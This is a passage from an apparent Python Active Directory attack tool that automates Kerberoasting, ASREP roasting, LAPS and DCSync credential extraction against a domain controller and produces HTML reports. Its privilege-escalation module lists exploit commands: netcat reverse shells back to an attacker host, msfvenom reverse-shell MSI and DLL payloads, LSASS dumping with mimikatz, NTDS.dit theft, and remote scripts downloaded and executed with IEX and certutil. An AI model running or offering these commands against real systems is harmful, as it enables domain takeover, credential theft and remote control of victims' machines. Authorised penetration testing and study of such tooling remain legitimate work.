                 ["pass","pwd","cred","secret","key","login","temp","welcome","admin"])]
    if desc_hits:
        add_finding("CRITICAL", "Credentials in user descriptions (NXC)", "\n".join(desc_hits), [])

    # 6. get-desc-users
    run_nxc_cmd("Get-desc-users",
        f"{nxc} ldap {dc} -u '{u}' -p '{p}' -M get-desc-users 2>/dev/null")

    # 7. ASREP roast — always against DC
    asrep_file = os.path.join(outdir, "asrep_hashes.txt")
    run_nxc_cmd("ASREPRoast",
        f"{nxc} ldap {dc} -u '{u}' -p '' --asreproast {asrep_file} 2>/dev/null", timeout=45)
    try:
        with open(asrep_file) as f: hashes = [l.strip() for l in f if l.strip()]
        if hashes:
            console.print(f"  [bold red]  [!] {len(hashes)} ASREP hash(es) → {asrep_file}[/bold red]")
            add_finding("CRITICAL", f"ASREP hashes captured ({len(hashes)})",
                "\n".join(hashes[:5]),
                [f"hashcat -m 18200 {asrep_file} /usr/share/wordlists/rockyou.txt",
                 f"john --wordlist=/usr/share/wordlists/rockyou.txt {asrep_file}"])
    except: pass

    # 8. Kerberoasting — always against DC
    kerb_file = os.path.join(outdir, "kerb_hashes.txt")
    run_nxc_cmd("Kerberoasting",
        f"{nxc} ldap {dc} -u '{u}' -p '{p}' --kerberoasting {kerb_file} 2>/dev/null", timeout=45)
    try:
        with open(kerb_file) as f: hashes = [l.strip() for l in f if l.strip() and "$krb5" in l]
        if hashes:
            console.print(f"  [bold red]  [!] {len(hashes)} Kerberoast hash(es) → {kerb_file}[/bold red]")
            add_finding("CRITICAL", f"Kerberoast hashes captured ({len(hashes)})",
                "\n".join(hashes[:3]),
                [f"hashcat -m 13100 {kerb_file} /usr/share/wordlists/rockyou.txt",
                 f"hashcat -m 19700 {kerb_file} /usr/share/wordlists/rockyou.txt"])
    except: pass

    # 9. No-preauth targets — always against DC
    if os.path.exists(users_file):
        nopreauth_file = os.path.join(outdir, "nopreauth_hashes.txt")
        run_nxc_cmd("No-preauth targets",
            f"{nxc} ldap {dc} -u '{u}' -p '{p}' --no-preauth-targets {users_file} "
            f"--kerberoasting {nopreauth_file} 2>/dev/null", timeout=45)

    # 10. LAPS — against DC
    lines = run_nxc_cmd("LAPS passwords",
        f"{nxc} ldap {dc} -u '{u}' -p '{p}' -M laps 2>/dev/null")
    laps_hits = [l for l in lines if "laps" in l.lower() or "password" in l.lower()]
    if laps_hits:
        add_finding("CRITICAL", "LAPS password(s) readable", "\n".join(laps_hits), [])

    # 11. LDAP shares (on DC)
    lines = run_nxc_cmd("LDAP shares (DC)",
        f"{nxc} ldap {dc} -u '{u}' -p '{p}' --shares 2>/dev/null")
    if [l for l in lines if "WRITE" in l.upper()]:
        add_finding("HIGH", "Writable shares on DC",
            "\n".join(l for l in lines if "WRITE" in l.upper()),
            [f"smbclient //{dc}/<SHARE> -U '{d}\\{u}%{p}'"])

    # 12. ADCS — certipy queries DC
    if tool_ok("certipy-ad") or tool_ok("certipy"):
        certipy = "certipy-ad" if tool_ok("certipy-ad") else "certipy"
        lines = run_nxc_cmd("ADCS vulnerable templates (Certipy)",
            f"{certipy} find -u {u}@{d} -p '{p}' -target {d} -dc-ip {dc} -text -stdout -vulnerable 2>/dev/null",
            timeout=60)
        vuln_hits = [l for l in lines if any(x in l for x in ["ESC","Vulnerable","Template","Client Auth"])]
        if vuln_hits:
            add_finding("CRITICAL", "Vulnerable ADCS template(s)",
                "\n".join(vuln_hits[:20]),
                [f"certipy-ad req -u {u}@{d} -p '{p}' -ca '<CA>' -template '<TPL>' -upn 'administrator@{d}'",
                 f"certipy-ad auth -pfx administrator.pfx -dc-ip {dc}"])
    else:
        console.print("  [dim]  certipy-ad not found — skipping ADCS[/dim]")

    # 13. BloodHound — queries DC
    if not args.no_bloodhound:
        run_nxc_cmd("BloodHound collection",
            f"{nxc} ldap {dc} -u '{u}' -p '{p}' --bloodhound --collection All "
            f"--dns-server {dc} 2>/dev/null", timeout=120)

    # 14. DCSync probe — against DC
    if tool_ok("secretsdump.py") or tool_ok("impacket-secretsdump"):
        sd = "secretsdump.py" if tool_ok("secretsdump.py") else "impacket-secretsdump"
        console.print(f"  [bold yellow]  ▶ DCSync rights probe (krbtgt via secretsdump)[/bold yellow]")
        out2, _, _ = run_cmd(
            f"{sd} {d}/{u}:'{p}'@{dc} -just-dc-user krbtgt -no-pass 2>/dev/null | head -5",
            timeout=20)
        if out2 and "krbtgt" in out2.lower() and ":::" in out2:
            add_finding("CRITICAL", "DCSync confirmed — full domain hash dump possible",
                out2[:300],
                [f"{sd} {d}/{u}:'{p}'@{dc} -just-dc-ntlm",
                 f"{sd} {d}/{u}:'{p}'@{dc} -just-dc"])
            for l in out2.splitlines(): safe_print(f"    {l}")
        else:
            console.print("    [dim](no DCSync rights, or secretsdump not available)[/dim]")
        console.print()

    # ══════════════════════════════════════════════════════════════════════
    # PART B — HOST COMMANDS  →  always against --target
    # These work against ANY Windows machine (DC or workstation).
    # ══════════════════════════════════════════════════════════════════════
    section(f"NXC — HOST OPERATIONS  (target: {host})")

    # 15. SMB auth + Pwn3d check
    lines = run_nxc_cmd("SMB auth check",
        f"{nxc} smb {host} -u '{u}' -p '{p}' --continue-on-success 2>/dev/null")
    if any("Pwn3d" in l for l in lines):
        add_finding("CRITICAL", f"SMB Admin (Pwn3d!) on {host}",
            "\n".join(l for l in lines if "Pwn3d" in l),
            [f"psexec.py {d}/{u}:'{p}'@{host}",
             f"wmiexec.py {d}/{u}:'{p}'@{host}",
             f"smbexec.py {d}/{u}:'{p}'@{host}",
             f"{nxc} smb {host} -u '{u}' -p '{p}' -x 'whoami /all'"])

    # 16. SMB shares on target host
    lines = run_nxc_cmd(f"SMB shares on {host}",
        f"{nxc} smb {host} -u '{u}' -p '{p}' --shares 2>/dev/null")
    writable = [l for l in lines if "WRITE" in l.upper()]
    if writable:
        add_finding("HIGH", f"Writable SMB shares on {host} ({len(writable)})",
            "\n".join(writable),
            [f"smbclient //{host}/<SHARE> -U '{d}\\{u}%{p}'",
             f"{nxc} smb {host} -u '{u}' -p '{p}' -M spider_plus"])

    # 17. SMB logged-on users
    run_nxc_cmd(f"SMB logged-on users ({host})",
        f"{nxc} smb {host} -u '{u}' -p '{p}' --loggedon-users 2>/dev/null")

    # 18. SMB sessions
    run_nxc_cmd(f"SMB sessions ({host})",
        f"{nxc} smb {host} -u '{u}' -p '{p}' --sessions 2>/dev/null")

    # 19. Password policy
    run_nxc_cmd(f"Password policy ({host})",
        f"{nxc} smb {host} -u '{u}' -p '{p}' --pass-pol 2>/dev/null")

    # 20. Local groups
    run_nxc_cmd(f"Local groups ({host})",
        f"{nxc} smb {host} -u '{u}' -p '{p}' --local-groups 2>/dev/null")

    # 21. Local users (SAM)
    lines = run_nxc_cmd(f"Local users ({host})",
        f"{nxc} smb {host} -u '{u}' -p '{p}' --local-auth --users 2>/dev/null")

    # 22. WinRM
    lines = run_nxc_cmd(f"WinRM access ({host})",
        f"{nxc} winrm {host} -u '{u}' -p '{p}' 2>/dev/null")
    if any("Pwn3d" in l or "(Pwn3d!)" in l for l in lines):
        add_finding("HIGH", f"WinRM access on {host}",
            f"{u} can WinRM into {host}",
            [f"evil-winrm -i {host} -u '{u}' -p '{p}'"])

    # 23. RDP
    lines = run_nxc_cmd(f"RDP access ({host})",
        f"{nxc} rdp {host} -u '{u}' -p '{p}' 2>/dev/null")
    if any("+" in l for l in lines):
        add_finding("HIGH", f"RDP access on {host}",
            f"{u} has RDP access to {host}",
            [f"xfreerdp /v:{host} /u:'{u}' /p:'{p}' /dynamic-resolution /cert-ignore"])

    # 24. MSSQL
    lines = run_nxc_cmd(f"MSSQL ({host})",
        f"{nxc} mssql {host} -u '{u}' -p '{p}' 2>/dev/null")
    if any("+" in l for l in lines):
        add_finding("HIGH", f"MSSQL access on {host}",
            "\n".join(l for l in lines if "+" in l),
            [f"mssqlclient.py {d}/{u}:'{p}'@{host} -windows-auth",
             f"{nxc} mssql {host} -u '{u}' -p '{p}' -q 'SELECT SYSTEM_USER'",
             f"{nxc} mssql {host} -u '{u}' -p '{p}' --local-auth -q 'EXEC xp_cmdshell whoami'"])

    # 25. GPP passwords
    run_nxc_cmd(f"GPP passwords ({host})",
        f"{nxc} smb {host} -u '{u}' -p '{p}' -M gpp_password 2>/dev/null")

    # 26. GPP autologin
    run_nxc_cmd(f"GPP autologin ({host})",
        f"{nxc} smb {host} -u '{u}' -p '{p}' -M gpp_autologin 2>/dev/null")

    # 27. SYSVOL spider
    run_nxc_cmd(f"SYSVOL spider ({host})",
        f"{nxc} smb {host} -u '{u}' -p '{p}' -M spider_plus -o DOWNLOAD_FLAG=False 2>/dev/null | head -40",
        timeout=30)

    # 28. PrintNightmare / SMB vuln scan
    run_nxc_cmd(f"SMB vuln scan ({host})",
        f"nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms10-061,smb2-security-mode "
        f"{host} -oN /dev/null 2>/dev/null | head -25", timeout=35)

    # 29. Enum4linux-ng (comprehensive — only if not running against DC already done)
    if tool_ok("enum4linux-ng"):
        run_nxc_cmd(f"enum4linux-ng ({host})",
            f"enum4linux-ng -A {host} -u '{u}' -p '{p}' 2>/dev/null | head -60", timeout=60)

# ═════════════════════════════════════════════════════════════════════════════
# MODULE 9 — WINDOWS PRIVESC REFERENCE
# ═════════════════════════════════════════════════════════════════════════════

def module_windows_privesc(args):
    lh  = args.lhost or "<LHOST>"
    lp  = args.lport or "4444"
    tgt = args.target or args.dc_ip
    u   = args.user or "<USER>"
    p   = args.password or "<PASS>"

    privesc = {
        "seimpersonate": {
            "title": "SeImpersonatePrivilege → SYSTEM",
            "severity": "CRITICAL",
            "detail": "Service/IIS account with SeImpersonate → instant SYSTEM via potato attacks.",
            "check_cmds": ["whoami /priv | findstr /i SeImpersonate"],
            "exploit_cmds": [
                f".\\PrintSpoofer64.exe -i -c cmd",
                f".\\GodPotato-NET4.exe -cmd 'nc {lh} {lp} -e cmd'",
                f".\\JuicyPotatoNG.exe -t * -p C:\\Windows\\System32\\cmd.exe",
            ],
        },
        "sedebugprivilege": {
            "title": "SeDebugPrivilege → LSASS dump",
            "severity": "CRITICAL",
            "detail": "SeDebugPrivilege → dump LSASS → plaintext creds + NTLM hashes.",
            "check_cmds": ["whoami /priv | findstr SeDebug"],
            "exploit_cmds": [
                "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
                "mimikatz # sekurlsa::minidump lsass.dmp",
                "mimikatz # sekurlsa::logonpasswords",
            ],
        },
        "sebackupprivilege": {
            "title": "SeBackupPrivilege → NTDS.dit dump",
            "severity": "CRITICAL",
            "detail": "Backup Operators → copy NTDS.dit → full domain credential dump.",
            "check_cmds": ["whoami /priv | findstr SeBackup", "net localgroup 'Backup Operators'"],
            "exploit_cmds": [
                "diskshadow /s shadow.txt",
                "Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit",
                "reg save HKLM\\SYSTEM SYSTEM.SAV",
                f"secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL",
            ],
        },
        "setakeownership": {
            "title": "SeTakeOwnershipPrivilege → protected files",
            "severity": "HIGH",
            "detail": "Take ownership of SAM/NTDS/web.config.",
            "check_cmds": ["whoami /priv | findstr SeTakeOwnership"],
            "exploit_cmds": [
                "takeown /f 'C:\\Windows\\repair\\SAM'",
                "icacls 'C:\\Windows\\repair\\SAM' /grant <USERNAME>:F",
            ],
        },
        "always_install_elevated": {
            "title": "AlwaysInstallElevated → SYSTEM MSI",
            "severity": "HIGH",
            "detail": "Both HKLM+HKCU = 1 → any user installs MSI as SYSTEM.",
            "check_cmds": [
                "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            ],
            "exploit_cmds": [
                f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lh} LPORT={lp} -f msi -o evil.msi",
                "msiexec /quiet /qn /i evil.msi",
            ],
        },
        "unquoted_service_paths": {
            "title": "Unquoted service paths",
            "severity": "HIGH",
            "detail": "Paths with spaces and no quotes — place binary in writable segment.",
            "check_cmds": [
                'wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "c:\\windows"',
                'Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch \'"\' -and $_.PathName -match \' \'}',
            ],
            "exploit_cmds": [
                "copy evil.exe 'C:\\Program Files\\Vuln\\App.exe'",
                "sc stop <SERVICE> && sc start <SERVICE>",
            ],
        },
        "weak_service_perms": {
            "title": "Weak service binary permissions",
            "severity": "HIGH",
            "detail": "Writable service binary → replace with payload.",
            "check_cmds": [
                "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
                'Get-Acl "C:\\path\\to\\service.exe" | Format-List',
            ],
            "exploit_cmds": [
                "copy evil.exe 'C:\\Path\\service.exe'",
                "net stop <SERVICE> && net start <SERVICE>",
            ],
        },
        "scheduled_tasks": {
            "title": "Writable scheduled task scripts",
            "severity": "HIGH",
            "detail": "SYSTEM task with writable script → instant privesc.",
            "check_cmds": [
                "schtasks /query /fo LIST /v | findstr /i 'task name\\|run as\\|task to run'",
                "Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq 'Highest'}",
            ],
            "exploit_cmds": [
                f"echo 'powershell -e <BASE64>' >> C:\\Scripts\\task.ps1",
            ],
        },
        "mssql_xp": {
            "title": "MSSQL xp_cmdshell → SeImpersonate",
            "severity": "HIGH",
            "detail": "MSSQL SA/sysadmin → xp_cmdshell → potato attack.",
            "check_cmds": [
                f"mssqlclient.py {u}@{tgt} -windows-auth",
                "SQL> SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')",
                "SQL> enable_xp_cmdshell",
                "SQL> xp_cmdshell whoami /priv",
            ],
            "exploit_cmds": [
                f"SQL> xp_cmdshell 'c:\\tools\\PrintSpoofer64.exe -c \"nc {lh} {lp} -e cmd\"'",
            ],
        },
        "dll_hijacking": {
            "title": "DLL hijacking",
            "severity": "MEDIUM",
            "detail": "App loads DLL from writable path → code execution.",
            "check_cmds": [
                "# ProcMon: Result=NAME NOT FOUND, Path ends .dll, in writable dir",
                "Get-ChildItem $env:PATH -include *.dll -recurse 2>$null | icacls",
            ],
            "exploit_cmds": [
                f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lh} LPORT={lp} -f dll -o mal.dll",
            ],
        },
        "credential_hunting": {
            "title": "Credential hunting",
            "severity": "HIGH",
            "detail": "Common cleartext credential locations.",
            "check_cmds": [
                "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
                "reg query HKLM /f password /t REG_SZ /s",
                "reg query HKCU /f password /t REG_SZ /s",
                "dir /s /b *pass* *cred* *vnc* *.config 2>nul",
                "findstr /si \"password\" *.txt *.ini *.config *.xml 2>nul",
                ".\\lazagne.exe all",
                "Invoke-SessionGopher -Thorough",
                "Get-ChildItem C:\\Users -Recurse -Include *.txt,*.xml,*.ini,*.config | Select-String -Pattern 'password'",
            ],
            "exploit_cmds": [],
        },
        "kernel_exploits": {
            "title": "Kernel exploits (WES-NG / Sherlock)",
            "severity": "HIGH",
            "detail": "Check kernel version against known CVEs.",
            "check_cmds": [
                "systeminfo | findstr /i 'os version\\|build\\|hotfix'",
                "wmic qfe list",
            ],
            "exploit_cmds": [
                "systeminfo > sysinfo.txt  # on target, transfer to Kali",
                "python3 wes.py sysinfo.txt -i 'Elevation of Privilege'",
                "Import-Module .\\Sherlock.ps1; Find-AllVulns",
                "# CVE-2021-34527 PrintNightmare, CVE-2021-36934 HiveNightmare",
            ],
        },
        "privesccheck": {
            "title": "PrivescCheck (itm4n) — comprehensive scan",
            "severity": "INFO",
            "detail": "Must run ON the target as low-priv user. Covers all local vectors.",
            "check_cmds": [
                f"python3 -m http.server 8000  # serve PrivescCheck.ps1 from Kali",
            ],
            "exploit_cmds": [
                "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"",
                "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck -Format HTML\"",
                f"powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lh}:8000/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended\"",
                f"nxc smb {tgt} -u '{u}' -p '{p}' --exec-method atexec -X "
                f"'powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://{lh}:8000/PrivescCheck.ps1\\\"); Invoke-PrivescCheck\"'",
            ],
        },
        "winpeas": {
            "title": "WinPEAS / PowerUp",
            "severity": "INFO",
            "detail": "Automated local privesc enumeration.",
            "check_cmds": [],
            "exploit_cmds": [
                f"certutil.exe -urlcache -split -f http://{lh}:8000/winPEASx64.exe winPEASx64.exe",
                f"copy \\\\{lh}\\share\\winPEASx64.exe .",
                ".\\winPEASx64.exe",
                ".\\winPEASx64.exe quiet",
                "Import-Module .\\PowerUp.ps1; Invoke-AllChecks",
                ".\\SharpUp.exe audit",
            ],
        },
    }
    with results_lock: results["privesc_checks"] = privesc

# ═════════════════════════════════════════════════════════════════════════════
# CONSOLE REPORT
# ═════════════════════════════════════════════════════════════════════════════

def print_domain_summary():
    d = results.get("domain", {})
    if not d: return
    t = Table(title="Domain Summary", box=richbox.SIMPLE, show_header=False)
    t.add_column("Key", style="cyan", width=26)
    t.add_column("Value", style="white")
    for k, v in [
        ("Domain", d.get("name","?")), ("Min Pwd Length", d.get("min_pwd_length","?")),
        ("Lockout Threshold", d.get("lockout_threshold","?")),
        ("Pwd History", d.get("pwd_history","?")),
        ("MAQ", d.get("machine_account_quota","?")),
    ]: t.add_row(k, str(v))
    dcs = d.get("domain_controllers",[])
    if dcs: t.add_row("Domain Controllers", "\n".join(f"{dc['hostname']} ({dc['os']})" for dc in dcs))
    console.print(t)

def print_stats():
    section("STATISTICS")
    t = Table(box=richbox.SIMPLE, show_header=False)
    t.add_column("Metric", style="cyan", width=32)
    t.add_column("Count", style="bold white")
    for label, count in [
        ("Users enumerated",      len(results["users"])),
        ("Computers enumerated",  len(results["computers"])),
        ("Groups enumerated",     len(results["groups"])),
        ("Kerberoastable",        len(results["spn_users"])),
        ("ASREPRoastable",        len(results["asrep_users"])),
        ("Unconstrained comps",   len(results["unconstrained_computers"])),
        ("Constrained deleg",     len(results.get("constrained",[]))),
        ("Creds in descriptions", len(results["password_in_desc"])),
        ("Stale computers",       len(results["stale_computers"])),
        ("Trusts",                len(results["trusts"])),
        ("GPOs",                  len(results["gpos"])),
    ]:
        s = "bold red" if count > 0 and "enumerated" not in label else "white"
        t.add_row(label, f"[{s}]{count}[/{s}]")
    sev_counts = {}
    for f in results["findings"]: sev_counts[f["severity"]] = sev_counts.get(f["severity"],0)+1
    for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
        c = sev_counts.get(sev,0)
        st = SEV_STYLE.get(sev,"white")
        t.add_row(f"Findings — {sev}", f"[{st}]{c}[/{st}]")
    console.print(t)

def print_findings():
    section("FINDINGS")
    findings = sorted(results["findings"], key=lambda f: SEV_ORDER.get(f["severity"],99))
    for f in findings:
        sev = f["severity"]; style = SEV_STYLE.get(sev,"white")
        console.print(f"  [{style}][{sev}][/{style}]  [bold white]{f['title']}[/bold white]")
        if f["detail"]:
            for line in f["detail"].split("\n"):
                safe_print(f"         {line}")
        console.print()

def print_privesc():
    privesc = results.get("privesc_checks",{})
    if not privesc: return
    section("WINDOWS PRIVESC PATHS — run on compromised host")
    ORDER = ["seimpersonate","sedebugprivilege","sebackupprivilege","setakeownership",
             "always_install_elevated","unquoted_service_paths","weak_service_perms",
             "scheduled_tasks","mssql_xp","dll_hijacking","credential_hunting",
             "kernel_exploits","privesccheck","winpeas"]
    for key in ORDER:
        if key not in privesc: continue
        ch = privesc[key]; sev = ch["severity"]; style = SEV_STYLE.get(sev,"white")
        console.print(f"  [{style}][{sev}][/{style}]  [bold white]{ch['title']}[/bold white]")
        console.print(f"         [dim]{ch['detail']}[/dim]")
        if ch["check_cmds"]:
            console.print("         [cyan]  Check:[/cyan]")
            for c in ch["check_cmds"]: safe_print(f"           $ {c}")
        if ch["exploit_cmds"]:
            console.print("         [yellow]  Run:[/yellow]")
            for c in ch["exploit_cmds"]: safe_print(f"           $ {c}")
        console.print()

# ═════════════════════════════════════════════════════════════════════════════
# HTML REPORT
# ═════════════════════════════════════════════════════════════════════════════

def sev_colour(sev):
    return {"CRITICAL":"#e74c3c","HIGH":"#e67e22","MEDIUM":"#f1c40f",
            "LOW":"#95a5a6","INFO":"#3498db"}.get(sev,"#7f8c8d")

def html_escape(s):
    return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"','&quot;')

def save_html(outdir, args):
    path = os.path.join(outdir, "adreaper_report.html")
    d = results.get("domain",{})
    dcs = d.get("domain_controllers",[])
    findings = sorted(results["findings"], key=lambda f: SEV_ORDER.get(f["severity"],99))
    privesc  = results.get("privesc_checks",{})
    nxc_out  = results.get("nxc_output",{})
    meta_time = datetime.now().strftime("%Y-%m-%d %H:%M")

    sev_counts = {}
    for f in findings: sev_counts[f["severity"]] = sev_counts.get(f["severity"],0)+1

    def stat_card(label, value, colour="#3498db"):
        return f"""<div class="stat-card"><div class="stat-value" style="color:{colour}">{value}</div><div class="stat-label">{label}</div></div>"""

    finding_cards = ""
    for f in findings:
        clr = sev_colour(f["severity"])
        cmds_html = ""
        if f["commands"]:
            cmds_html = "<div class='cmd-block'><div class='cmd-label'>Commands to run:</div><pre>" + "\n".join(html_escape(c) for c in f["commands"]) + "</pre></div>"
        raw_html = ""
        if f.get("raw_output"):
            raw_html = f"<div class='raw-block'><pre>{html_escape(f['raw_output'])}</pre></div>"
        detail_html = f"<div class='finding-detail'>{html_escape(f['detail']).replace(chr(10),'<br>')}</div>" if f["detail"] else ""
        finding_cards += f"""
        <div class="finding-card" data-sev="{f['severity']}">
          <div class="finding-header" style="border-left:4px solid {clr}">
            <span class="sev-badge" style="background:{clr}">{f['severity']}</span>
            <span class="finding-title">{html_escape(f['title'])}</span>
          </div>
          <div class="finding-body">
            {detail_html}{cmds_html}{raw_html}
          </div>
        </div>"""

    # User table
    kerb_names = {u["name"] for u in results["spn_users"]}
    asrep_names = set(results["asrep_users"])
    user_rows = ""
    for u in results["users"]:
        name = html_escape(u["name"])
        kerb = "✓" if u["name"] in kerb_names else ""
        asrep = "✓" if u["name"] in asrep_names else ""
        admin = "✓" if u.get("admin") else ""
        never = "✓" if u.get("pwd_last_set") == "Never" else ""
        desc = html_escape(u.get("description","") or "")
        row_class = ""
        if u["name"] in kerb_names: row_class = "row-high"
        if u["name"] in asrep_names: row_class = "row-high"
        if admin: row_class = "row-critical"
        user_rows += f"<tr class='{row_class}'><td>{name}</td><td class='center'>{kerb}</td><td class='center'>{asrep}</td><td class='center'>{admin}</td><td class='center'>{never}</td><td class='desc'>{desc}</td></tr>"

    # Computer table
    comp_rows = ""
    for c in results["computers"]:
        stale_cls = "row-medium" if c.get("stale") else ""
        stale_txt = "⚠ YES" if c.get("stale") else "No"
        udc = c.get("unconstrained","")
        comp_rows += f"<tr class='{stale_cls}'><td>{html_escape(c['hostname'])}</td><td>{html_escape(c['os'])}</td><td>{stale_txt}</td><td>{c.get('days_since_logon','?')}</td></tr>"

    # Privesc section
    PRIV_ORDER = ["seimpersonate","sedebugprivilege","sebackupprivilege","setakeownership",
                  "always_install_elevated","unquoted_service_paths","weak_service_perms",
                  "scheduled_tasks","mssql_xp","dll_hijacking","credential_hunting",
                  "kernel_exploits","privesccheck","winpeas"]
    privesc_html = ""
    for key in PRIV_ORDER:
        if key not in privesc: continue
        ch = privesc[key]; clr = sev_colour(ch["severity"])
        chk = "\n".join(ch.get("check_cmds",[]))
        expl = "\n".join(ch.get("exploit_cmds",[]))
        privesc_html += f"""
        <div class="privesc-card">
          <div class="privesc-header" style="border-left:4px solid {clr}">
            <span class="sev-badge" style="background:{clr}">{ch['severity']}</span>
            <span class="finding-title">{html_escape(ch['title'])}</span>
          </div>
          <div class="privesc-body">
            <div class="finding-detail">{html_escape(ch['detail'])}</div>
            {"<div class='cmd-label'>Check:</div><pre>" + html_escape(chk) + "</pre>" if chk else ""}
            {"<div class='cmd-label'>Run on target:</div><pre>" + html_escape(expl) + "</pre>" if expl else ""}
          </div>
        </div>"""

    # NXC raw output
    nxc_html = ""
    for label, output in nxc_out.items():
        if not output.strip(): continue
        nxc_html += f"""<div class="nxc-section"><div class="nxc-label">▶ {html_escape(label)}</div><pre>{html_escape(output)}</pre></div>"""

    crit = sev_counts.get("CRITICAL",0)
    high = sev_counts.get("HIGH",0)
    med  = sev_counts.get("MEDIUM",0)

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ADReaper — {html_escape(args.domain)} — {meta_time}</title>
<style>
  :root {{
    --bg: #0d1117; --surface: #161b22; --surface2: #21262d;
    --border: #30363d; --text: #c9d1d9; --text-dim: #8b949e;
    --red: #e74c3c; --orange: #e67e22; --yellow: #f1c40f;
    --blue: #3498db; --green: #2ecc71; --purple: #9b59b6;
  }}
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 14px; }}
  a {{ color: var(--blue); text-decoration: none; }}

  /* NAV */
  .nav {{ background: var(--surface); border-bottom: 1px solid var(--border); padding: 12px 24px;
          display: flex; align-items: center; gap: 20px; position: sticky; top: 0; z-index: 100; }}
  .nav-brand {{ color: var(--red); font-weight: 700; font-size: 18px; letter-spacing: 2px; }}
  .nav-links {{ display: flex; gap: 16px; margin-left: auto; }}
  .nav-links a {{ color: var(--text-dim); font-size: 13px; padding: 4px 10px; border-radius: 6px; }}
  .nav-links a:hover {{ background: var(--surface2); color: var(--text); }}

  /* HERO */
  .hero {{ background: linear-gradient(135deg, #0d1117 0%, #1a1f29 50%, #0d1117 100%);
           border-bottom: 1px solid var(--border); padding: 24px 24px 20px; text-align: center; }}
  .hero-sub {{ color: var(--text-dim); font-size: 12px; letter-spacing: 1px; margin-bottom: 20px; }}
  .hero-meta {{ display: flex; justify-content: center; gap: 32px; margin-top: 24px; flex-wrap: wrap; }}
  .hero-meta-item {{ background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
                     padding: 8px 20px; }}
  .hero-meta-item .label {{ color: var(--text-dim); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }}
  .hero-meta-item .value {{ color: var(--text); font-weight: 600; font-size: 15px; margin-top: 2px; }}

  /* STATS */
  .stats-section {{ padding: 24px; }}
  .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; }}
  .stat-card {{ background: var(--surface); border: 1px solid var(--border); border-radius: 10px;
                padding: 16px; text-align: center; }}
  .stat-value {{ font-size: 28px; font-weight: 700; }}
  .stat-label {{ color: var(--text-dim); font-size: 11px; margin-top: 4px; text-transform: uppercase; letter-spacing: 0.5px; }}

  /* SECTIONS */
  .section {{ padding: 24px; border-top: 1px solid var(--border); }}
  .section-title {{ font-size: 18px; font-weight: 700; color: var(--text); margin-bottom: 16px;
                    display: flex; align-items: center; gap: 8px; }}
  .section-title::before {{ content: ''; display: block; width: 4px; height: 20px;
                             background: var(--red); border-radius: 2px; }}

  /* FILTER BAR */
  .filter-bar {{ display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }}
  .filter-btn {{ background: var(--surface2); border: 1px solid var(--border); color: var(--text-dim);
                 padding: 5px 14px; border-radius: 20px; cursor: pointer; font-size: 12px; transition: all .2s; }}
  .filter-btn:hover, .filter-btn.active {{ border-color: var(--red); color: var(--text); }}
  .filter-btn.active {{ background: var(--red); color: #fff; border-color: var(--red); }}

  /* FINDING CARDS */
  .finding-card {{ background: var(--surface); border: 1px solid var(--border); border-radius: 10px;
                   margin-bottom: 12px; overflow: hidden; transition: transform .15s; }}
  .finding-card:hover {{ transform: translateY(-1px); border-color: #444; }}
  .finding-header {{ padding: 14px 16px; display: flex; align-items: center; gap: 12px; cursor: pointer;
                     background: var(--surface2); }}
  .finding-body {{ padding: 16px; display: none; }}
  .finding-body.open {{ display: block; }}
  .finding-title {{ font-weight: 600; font-size: 14px; }}
  .finding-detail {{ color: var(--text-dim); font-size: 13px; margin-bottom: 12px; white-space: pre-wrap; }}
  .sev-badge {{ font-size: 10px; font-weight: 700; letter-spacing: 1px; padding: 3px 8px;
                border-radius: 4px; color: #fff; white-space: nowrap; }}

  /* COMMANDS */
  .cmd-block {{ margin-top: 8px; }}
  .cmd-label {{ color: var(--text-dim); font-size: 11px; text-transform: uppercase; letter-spacing: 1px;
                margin-bottom: 6px; }}
  pre {{ background: #0a0d12; border: 1px solid var(--border); border-radius: 6px; padding: 12px;
         font-size: 12px; overflow-x: auto; color: #79b8ff; white-space: pre-wrap; word-break: break-all; }}
  .raw-block pre {{ color: var(--text-dim); }}
  .copy-btn {{ float: right; background: var(--surface2); border: 1px solid var(--border);
               color: var(--text-dim); padding: 2px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; }}
  .copy-btn:hover {{ color: var(--text); }}

  /* TABLES */
  .table-wrap {{ overflow-x: auto; }}
  table {{ width: 100%; border-collapse: collapse; }}
  th {{ background: var(--surface2); padding: 10px 12px; text-align: left; font-size: 12px;
        font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-dim);
        border-bottom: 1px solid var(--border); }}
  td {{ padding: 9px 12px; border-bottom: 1px solid var(--border); font-size: 13px; }}
  tr:hover td {{ background: var(--surface2); }}
